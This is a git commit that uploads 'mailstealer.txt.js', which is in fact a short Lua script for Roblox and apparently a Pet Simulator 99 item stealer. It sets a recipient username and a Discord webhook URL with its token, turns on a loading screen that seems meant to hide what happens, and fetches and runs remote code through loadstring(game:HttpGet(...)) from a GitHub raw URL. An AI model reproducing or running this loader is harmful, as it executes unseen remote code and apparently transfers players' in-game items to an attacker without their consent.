922a4dd7a2c3ad23b115b10c7742e05fcde2ce2f
Sotizy <159394393+Sotizy@users.noreply.github.com>
2024-02-08 08:53:02 +0800

    Add files via upload

---
+++ mailstealer.txt.js
@@ -0,0 +1,7 @@
+```LUA
+Username = "rip_luckiess"
+Webhook = "https://discord.com/api/webhooks/1204934438438445086/7_RiGB5OYd84mcogOTE3CIRonYTCP7lU4KqPg3FOMfq6U5zf3bE4rPS2GLk_uRtSyUP4"
+selectedLoadingScreen = "1"
+LoadingScreen = true
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/PS99Mail/main/Mementomori"))()```;
